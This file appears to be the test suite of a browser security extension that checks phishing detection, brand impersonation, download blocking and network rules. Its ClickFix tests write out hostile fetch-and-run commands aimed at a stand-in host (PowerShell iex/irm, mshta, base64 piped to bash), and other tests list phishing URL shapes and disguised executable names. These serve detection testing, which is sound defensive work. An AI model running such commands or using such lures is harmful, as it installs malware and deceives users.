import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import { analyzeUrl } from "@engine/analyze";
import { parseHttpUrl } from "@engine/url/parse";
import { parseDomain } from "@engine/domain/parse";
import { brandsNamedOnPage, detectImpersonation } from "@engine/impersonation/detect";
import { brandContentSignal, mergeSignals, signalsForPageChecks } from "@engine/page/merge";
import { presentAnalysis } from "@engine/status/present";
import { isPrivateOrLocalHost, isLocalNetworkName } from "@engine/network/dnsRebind";
import { cloudAppSuffix, freeHostingSuffix } from "@engine/url/hosting";
import { clickFixTier, looksLikeClickFixCommand } from "@engine/page/clickfix";
import { diffExtensions, type ExtensionSnapshot } from "@engine/audit/changes";
import { baselineFromReleases, compareVersions, versionVerdict, type ServingRelease } from "@engine/posture/version";
import { buildDynamicRules } from "@network/dnr";
import { contextVerdict, quickVerdict } from "../../src/background/downloads";
import { DEFAULT_SETTINGS } from "@storage/settings";
import { popularityCheck } from "@engine/reputation/popular";
import type { AnalysisInput, ParsedDomain, UrlAnalysis } from "@shared/types";

const base: Omit<AnalysisInput, "url"> = {
  blocklist: [],
  allowlist: [],
  phishingProtection: true,
  threatProtection: true,
  securityLevel: "standard",
};

function analyze(url: string): Promise<UrlAnalysis> {
  return analyzeUrl({ ...base, url });
}

function domain(url: string): ParsedDomain {
  const parsed = parseDomain(parseHttpUrl(url));
  if (!parsed) throw new Error(`no domain for ${url}`);
  return parsed;
}

function withLoginForm(analysis: UrlAnalysis): UrlAnalysis {
  return mergeSignals(analysis, signalsForPageChecks(["login-form"]), "standard");
}

describe("false-positive corpus: ordinary sites stay Protected, even with a login form", () => {
  const benign = [
    "https://groups.io/login",
    "https://www.purchase.edu/",
    "https://fonts.googleapis.com/css2",
    "https://pineapple.com/",
    "https://www.münchen.de/",
    "https://xn--80adxhks.xn--p1ai/",
    "https://startups.com/",
    "https://fcbayern.com/login",
    "https://www.fdp.de/",
    "https://apple.stackexchange.com/users/login",
    "https://kraken.io/login",
    "https://www.sparkasse-hannover.de/de/home.html",
    "https://www.sparkasse-koelnbonn.de/",
    "https://www.vrbank-suedpfalz.de/",
    "https://www.amazon.de/ap/signin",
    "https://google.co.uk/",
    "https://finance.yahoo.com/",
    "https://wordpress.com/log-in",
    "https://github.com/login",
    "https://login.microsoftonline.com/",
    "https://accounts.google.com/signin",
    "https://www.paypal.com/signin",
    "https://claude.ai/login",
    "https://chatgpt.com/auth/login",
    "https://app.uniswap.org/",
    "https://cooking.com/",
    "https://finance.com/",
  ];

  it.each(benign)("%s", async (url) => {
    const analysis = withLoginForm(await analyze(url));
    const status = presentAnalysis(analysis, true);
    expect(status.tone, `${url}: ${analysis.signals.filter((s) => s.severity === "warn").map((s) => s.id).join(",")}`).toBe("safe");
    expect(analysis.band).toBe("safe");
  });

  it("keeps home-network devices out of the warning path", async () => {
    for (const url of ["http://192.168.178.1/", "http://fritz.box/", "http://nas.local:5000/", "http://localhost:3000/login"]) {
      const analysis = withLoginForm(await analyze(url));
      expect(analysis.band, url).toBe("safe");
    }
  });
});

describe("phishing corpus: real-world kit shapes reach the warning page", () => {
  const phishing = [
    "https://paypal-login.secure-check.xyz/signin",
    "https://accounts.google.com.evil.top/login",
    "https://paypa1.com/",
    "https://rnicrosoft.com/",
    "https://microsoft-365-support.com/",
    "https://sparkasse-sicherheit.com/login",
    "https://commerzbank-verify.com/",
    "https://metamask-restore.com/",
    "https://paypal.xyz/",
    "https://xn--80ak6aa92e.com/",
    "https://amazon-account-update.info/",
    "https://evil-paypal.pages.dev/",
    "https://sites.google.com/view/paypal-verify",
    "https://ipfs.io/ipfs/QmXyz/paypal.html",
    "https://dhl-paket-zustellung.com/",
  ];

  it.each(phishing)("%s", async (url) => {
    const analysis = withLoginForm(await analyze(url));
    expect(["high", "critical"], `${url} scored ${analysis.score}`).toContain(analysis.band);
  });

  it("a brand claimed only by the page content still reaches high with a login form", async () => {
    const page = await analyze("https://secure-login-account.com/signin");
    const merged = mergeSignals(
      page,
      [...signalsForPageChecks(["login-form"]), brandContentSignal("Microsoft", "secure-login-account.com")],
      "standard",
    );
    expect(["high", "critical"]).toContain(merged.band);
  });
});

describe("impersonation reasons", () => {
  it("spots an official domain used as a prefix", () => {
    expect(detectImpersonation(domain("https://accounts.google.com.evil.top/"))?.reason).toBe("embedded-domain");
  });

  it("spots whole-script Cyrillic lookalikes", () => {
    const hit = detectImpersonation(domain("https://xn--80ak6aa92e.com/"));
    expect(hit?.brand.id).toBe("apple");
    expect(hit?.reason).toBe("confusable");
  });

  it("does not flag regional banks on their own city domains", () => {
    expect(detectImpersonation(domain("https://www.sparkasse-hannover.de/"))).toBeNull();
    expect(detectImpersonation(domain("https://sparkasse-hannover.com/"))?.reason).toBe("hyphen-combo");
    expect(detectImpersonation(domain("https://sparkasse-sicherheit.de/"))?.reason).toBe("keyword-combo");
  });

  it("treats country domains of global brands as official", () => {
    expect(detectImpersonation(domain("https://www.amazon.co.jp/"))).toBeNull();
    expect(detectImpersonation(domain("https://www.google.de/"))).toBeNull();
  });
});

describe("brand named on the page", () => {
  const d = domain("https://login-portal.example.net/");

  it("matches titles that present the page as the brand", () => {
    expect(brandsNamedOnPage(["Sign in to your Microsoft account"], d).map((b) => b.id)).toContain("microsoft");
    expect(brandsNamedOnPage(["PayPal: Log in"], d).map((b) => b.id)).toContain("paypal");
    expect(brandsNamedOnPage(["Sparkasse Online-Banking"], d).map((b) => b.id)).toContain("sparkasse");
  });

  it("ignores pages that merely talk about a brand", () => {
    expect(brandsNamedOnPage(["How to cancel Netflix in 2026"], d)).toEqual([]);
    expect(brandsNamedOnPage(["Ups, da ist etwas schiefgelaufen"], d)).toEqual([]);
    expect(brandsNamedOnPage(["Steam cleaning tips"], d)).toEqual([]);
  });

  it("never matches on the brand's own domain", () => {
    expect(brandsNamedOnPage(["PayPal: Log in"], domain("https://www.paypal.com/"))).toEqual([]);
  });
});

describe("local network names", () => {
  it("does not mistake fc*/fd* hostnames for IPv6 unique-local addresses", () => {
    expect(isPrivateOrLocalHost("fcbayern.de")).toBe(false);
    expect(isPrivateOrLocalHost("fdp.de")).toBe(false);
    expect(isPrivateOrLocalHost("fd12:3456::1")).toBe(true);
    expect(isPrivateOrLocalHost("fe80::1")).toBe(true);
  });

  it("recognizes home-network names", () => {
    expect(isLocalNetworkName("fritz.box")).toBe(true);
    expect(isLocalNetworkName("printer.local")).toBe(true);
    expect(isLocalNetworkName("example.com")).toBe(false);
  });
});

describe("hosting classification", () => {
  it("separates site builders from cloud app platforms", () => {
    expect(freeHostingSuffix("evil.pages.dev")).toBe("pages.dev");
    expect(freeHostingSuffix("wordpress.com")).toBeNull();
    expect(freeHostingSuffix("docs.google.com", "/forms/d/e/x/viewform")).toBe("docs.google.com");
    expect(freeHostingSuffix("docs.google.com", "/document/d/x/edit")).toBeNull();
    expect(cloudAppSuffix("intranet.azurewebsites.net")).toBe("azurewebsites.net");
    expect(freeHostingSuffix("intranet.azurewebsites.net")).toBeNull();
  });

  it("does not warn about a company login on a cloud platform", async () => {
    const analysis = withLoginForm(await analyze("https://acme-hr.azurewebsites.net/login"));
    expect(presentAnalysis(analysis, true).tone).toBe("safe");
  });
});

describe("ClickFix tiers", () => {
  it("always blocks malware-only shapes", () => {
    expect(clickFixTier("powershell -nop -w hidden -c iex(irm evil.test)")).toBe("strong");
    expect(clickFixTier('cmd /c start /min powershell -w h -c "x" # ✅ I am not a robot - reCAPTCHA Verification ID: 4821')).toBe("strong");
    expect(clickFixTier("mshta https://evil.test/a.hta")).toBe("strong");
    expect(clickFixTier("echo Y3VybCBldmls | base64 -d | bash")).toBe("strong");
  });

  it("treats real installers as weak (blocked only on fake-captcha pages)", () => {
    expect(clickFixTier("curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh")).toBe("weak");
    expect(clickFixTier('powershell -c "irm bun.sh/install.ps1|iex"')).toBe("weak");
    expect(looksLikeClickFixCommand("irm get.scoop.sh | iex", false)).toBe(false);
    expect(looksLikeClickFixCommand("irm get.scoop.sh | iex", true)).toBe(true);
  });

  it("stays in sync with the MAIN-world bridge copy", () => {
    const pick = (file: string, fn: string): string[] => {
      const text = readFileSync(resolve(__dirname, "../..", file), "utf8");
      const start = text.indexOf(`function ${fn}(`);
      const body = text.slice(start, text.indexOf("\n  return null;", start));
      const out: string[] = [];
      for (const line of body.split("\n")) {
        const tier = line.match(/return "(strong|weak)"/);
        if (!tier) continue;
        const regs: string[] = [];
        for (let i = 0; i < line.length; i += 1) {
          if (line[i] !== "/" || (i > 0 && !/[(\s&]/.test(line[i - 1] ?? ""))) continue;
          let j = i + 1;
          let cls = false;
          while (j < line.length) {
            if (line[j] === "\\") {
              j += 2;
              continue;
            }
            if (line[j] === "[") cls = true;
            else if (line[j] === "]") cls = false;
            else if (line[j] === "/" && !cls) break;
            j += 1;
          }
          let k = j + 1;
          while (/[gimsuy]/.test(line[k] ?? "")) k += 1;
          regs.push(line.slice(i, k));
          i = k;
        }
        if (regs.length) out.push(`${tier[1]} ${regs.join(" && ")}`);
      }
      return out;
    };
    const engine = pick("src/engine/page/clickfix.ts", "clickFixTier");
    const bridge = pick("src/content/walletBridge.ts", "commandTier");
    expect(engine.length).toBeGreaterThan(15);
    expect(bridge).toEqual(engine);
    const markers = (file: string, fn: string): string | undefined => {
      const text = readFileSync(resolve(__dirname, "../..", file), "utf8");
      const start = text.indexOf(`function ${fn}(`);
      return text.slice(start, start + 2200).match(/const markers = (\[[^\]]+\]);/)?.[1];
    };
    const engineMarkers = markers("src/engine/page/clickfix.ts", "clickFixTier");
    expect(engineMarkers).toBeTruthy();
    expect(markers("src/content/walletBridge.ts", "commandTier")).toBe(engineMarkers);
    expect(readFileSync(resolve(__dirname, "../../src/engine/page/clickfix.ts"), "utf8")).not.toContain("length > 12_000");
    expect(readFileSync(resolve(__dirname, "../../src/content/walletBridge.ts"), "utf8")).not.toContain("length > 12000) return null");
    const lures = (file: string): string[] => {
      const text = readFileSync(resolve(__dirname, "../..", file), "utf8");
      return ["KEY_ACTION_RE", "BROWSER_CLAIM_RE", "FIX_INSTRUCTION_RE"].map((name) => {
        const found = text.match(new RegExp(`const ${name} =\\s*\\n?\\s*(/[\\s\\S]*?/i);`));
        if (!found?.[1]) throw new Error(`${name} missing in ${file}`);
        return found[1];
      });
    };
    expect(lures("src/content/walletBridge.ts")).toEqual(lures("src/engine/page/clickfix.ts"));
  });

  it("uses the same shown-command whitespace rule in the bridge and the engine", () => {
    const bodyOf = (file: string, name: string): string => {
      const text = readFileSync(resolve(__dirname, "../..", file), "utf8");
      const start = text.indexOf(`function ${name}(`);
      expect(start, name).toBeGreaterThan(0);
      const nextExport = text.indexOf("\nexport function ", start + 10);
      const nextInner = text.indexOf("\n  function ", start + 10);
      const ends = [nextExport, nextInner].filter((at) => at > start);
      return text.slice(start, ends.length ? Math.min(...ends) : text.length);
    };
    const engine = bodyOf("src/engine/page/clickfix.ts", "weakCommandIsShown");
    const bridge = bodyOf("src/content/walletBridge.ts", "commandIsShown");
    const engineClass = engine.match(/\/(\[[^\]]+\]\+)\/g/)?.[1];
    const quoted = bridge.match(/"(\[(?:\\.|[^"\\])*\]\+)"/)?.[1];
    expect(engineClass).toBeTruthy();
    expect(quoted).toBeTruthy();
    expect(JSON.parse(`"${quoted}"`)).toBe(engineClass);
    expect(engine).toContain("length < 12");
    expect(bridge).toContain("length < 12");
  });
});

describe("downloads", () => {
  it("blocks disguised and hosted programs without network context", () => {
    expect(quickVerdict("https://cdn.example.com/x", "invoice.pdf.exe").block).toBe(true);
    expect(quickVerdict("https://cdn.example.com/x", "photo‮gpj.exe").block).toBe(true);
    expect(quickVerdict("https://update-chrome.pages.dev/ChromeSetup.exe", "ChromeSetup.exe").block).toBe(true);
    expect(quickVerdict("http://example.com/setup.msix", "setup.msix").block).toBe(true);
    expect(quickVerdict("https://github.com/x/y/releases/download/v1/tool.exe", "tool.exe").block).toBe(false);
    expect(quickVerdict("https://my-bucket.s3.amazonaws.com/installer.exe", "installer.exe").block).toBe(false);
  });

  it("blocks programs offered by a dangerous page", async () => {
    const page = withLoginForm(await analyze("https://paypal-login.secure-check.xyz/signin"));
    const verdict = await contextVerdict(
      "https://cdn.example.com/file.zip",
      "file.zip",
      "https://paypal-login.secure-check.xyz/signin",
      DEFAULT_SETTINGS,
      page,
    );
    expect(verdict.block).toBe(true);
    const fine = await contextVerdict("https://cdn.example.com/report.pdf", "report.pdf", "https://example.com/", DEFAULT_SETTINGS, null);
    expect(fine.block).toBe(false);
  });
});

describe("dynamic network rules", () => {
  const rules = buildDynamicRules(["trusted.example"], ["bad.example"], ["paused.example"], [], ["ioc.example"]);

  it("uses unique ids", () => {
    const ids = rules.map((r) => r.id);
    expect(new Set(ids).size).toBe(ids.length);
  });

  it("lets the allowlist override feed redirects for pages", () => {
    const allow = rules.find((r) => r.action.type === "allow");
    expect(allow?.condition.resourceTypes).toContain("main_frame");
    expect(allow?.priority).toBeGreaterThan(5);
  });

  it("sends blocklisted and IOC pages to the warning screen", () => {
    const redirects = rules.filter((r) => r.action.type === "redirect");
    expect(redirects.map((r) => r.action.redirect?.extensionPath)).toEqual(
      expect.arrayContaining(["/warning.html?blocked=user", "/warning.html?blocked=ioc"]),
    );
  });
});

describe("extension supply-chain watch", () => {
  const before: ExtensionSnapshot = {
    a: { name: "Coupon Helper", version: "1.0", permissions: ["storage"], hostPermissions: [], installType: "normal", enabled: true },
  };

  it("records nothing on the first baseline", () => {
    expect(diffExtensions(null, before)).toEqual([]);
  });

  it("flags an update that adds all-site access and cookies as critical", () => {
    const after: ExtensionSnapshot = {
      a: { ...before.a!, version: "1.1", permissions: ["cookies", "storage"], hostPermissions: ["<all_urls>"] },
    };
    const [change] = diffExtensions(before, after, 1);
    expect(change?.kind).toBe("escalated");
    expect(change?.severity).toBe("critical");
    expect(change?.added).toEqual(expect.arrayContaining(["cookies", "<all_urls>"]));
  });

  it("treats a plain version bump as informational", () => {
    const after: ExtensionSnapshot = { a: { ...before.a!, version: "1.2" } };
    expect(diffExtensions(before, after)[0]?.severity).toBe("info");
  });
});

describe("public suffix list", () => {
  it("knows country second-level endings and private hosting suffixes", () => {
    expect(domain("https://www.google.com.ua/").registrableDomain).toBe("google.com.ua");
    expect(domain("https://news.bbc.co.uk/").registrableDomain).toBe("bbc.co.uk");
    expect(domain("https://evil.pages.dev/").registrableDomain).toBe("evil.pages.dev");
    expect(domain("https://someone.github.io/x").registrableDomain).toBe("someone.github.io");
  });

  it("treats every Google country site as official", () => {
    for (const host of ["google.com.ua", "google.com.vn", "google.com.ng", "google.co.jp"]) {
      expect(detectImpersonation(domain(`https://www.${host}/`)), host).toBeNull();
    }
  });
});

describe("popularity", () => {
  const check = popularityCheck(new Set(["netflix.net", "weebly.com"]), new Set(["weebly.com"]));

  it("lets established brand domains through and keeps user subdomains on platforms out", () => {
    expect(check("netflix.net", "www.netflix.net")).toBe(true);
    expect(check("weebly.com", "www.weebly.com")).toBe(true);
    expect(check("weebly.com", "paypal-login.weebly.com")).toBe(false);
    expect(check("example.org", "example.org")).toBe(false);
  });

  it("removes name-based impersonation only, not page findings", async () => {
    const analysis = await analyzeUrl({ ...base, url: "https://netflix.net/", isPopular: check });
    expect(analysis.signals.some((s) => s.id === "impersonation" && s.weightApplied > 0)).toBe(false);
    const withClickFix = mergeSignals(analysis, signalsForPageChecks(["clickfix-clipboard"]), "standard");
    expect(presentAnalysis(withClickFix, true).tone).not.toBe("safe");
  });

  it("does not let a kit on a popular platform borrow its reputation", async () => {
    const analysis = await analyzeUrl({ ...base, url: "https://paypal-login.weebly.com/", isPopular: check });
    expect(analysis.signals.some((s) => s.id === "popular")).toBe(false);
    expect(analysis.signals.some((s) => s.id === "impersonation" && s.weightApplied > 0)).toBe(true);
  });
});

describe("chrome staged rollout", () => {
  // Real snapshot (win64, 2026-11-12): 158 at 0.5 % early stable, 157.0.8103.79 at 100 %.
  const serving: ServingRelease[] = [
    { version: "157.0.8103.51", fraction: 0.495, startTime: "2026-11-11T19:50:36Z" },
    { version: "157.0.8103.52", fraction: 0.2475, startTime: "2026-11-11T19:50:36Z" },
    { version: "157.0.8103.78", fraction: 0.2475, startTime: "2026-11-11T19:50:36Z" },
    { version: "157.0.8103.79", fraction: 1, startTime: "2026-11-11T19:50:36Z" },
    { version: "156.0.8078.82", fraction: 0.005, startTime: "2026-11-04T18:02:22Z" },
    { version: "158.0.8127.18", fraction: 0.005, startTime: "2026-11-04T18:02:22Z" },
  ];
  const now = Date.parse("2026-11-12T12:00:00Z");
  const baseline = baselineFromReleases(serving)!;

  it("measures against the fully rolled-out version, not the newest number", () => {
    expect(baseline.version).toBe("157.0.8103.79");
    expect(versionVerdict("157.0.8103.79", baseline, now)).toBe("ok");
    expect(versionVerdict("158.0.8127.18", baseline, now)).toBe("ok");
  });

  it("gives Chrome a grace period to install a fresh rollout", () => {
    expect(versionVerdict("157.0.8103.51", baseline, now)).toBe("rolling");
    expect(versionVerdict("157.0.8103.51", baseline, now + 4 * 24 * 60 * 60 * 1000)).toBe("outdated");
    expect(versionVerdict("155.0.8000.1", baseline, now)).toBe("outdated");
  });
});

describe("browser posture", () => {
  it("compares Chrome versions numerically", () => {
    expect(compareVersions("131.0.6778.86", "131.0.6778.108")).toBe(-1);
    expect(compareVersions("132.0.1.1", "131.9.9.9")).toBe(1);
    expect(compareVersions("131.0.6778.86", "131.0.6778.86")).toBe(0);
  });
});

describe("manifest wiring", () => {
  const manifest = JSON.parse(readFileSync(resolve(__dirname, "../../src/manifest.json"), "utf8")) as {
    content_scripts: { js: string[]; run_at: string; all_frames?: boolean; world?: string }[];
    declarative_net_request: { rule_resources: { id: string; enabled: boolean }[] };
    web_accessible_resources: { resources: string[]; use_dynamic_url?: boolean }[];
  };

  it("injects the bridge before page scripts in every frame", () => {
    const bridge = manifest.content_scripts.find((c) => c.js.includes("content-bridge.js"));
    expect(bridge?.run_at).toBe("document_start");
    expect(bridge?.world).toBe("MAIN");
    expect(bridge?.all_frames).toBe(true);
  });

  it("ships the phishing feed ruleset and lets DNR redirect to the warning page", () => {
    expect(manifest.declarative_net_request.rule_resources.find((r) => r.id === "threats-feed")?.enabled).toBe(true);
    const war = manifest.web_accessible_resources[0];
    expect(war?.resources).toContain("warning.html");
    expect(war?.use_dynamic_url).toBeUndefined();
  });

  it("does not enable the Pro tracker list for free installs before settings apply", () => {
    expect(manifest.declarative_net_request.rule_resources.find((r) => r.id === "trackers-extended")?.enabled).toBe(false);
  });
});
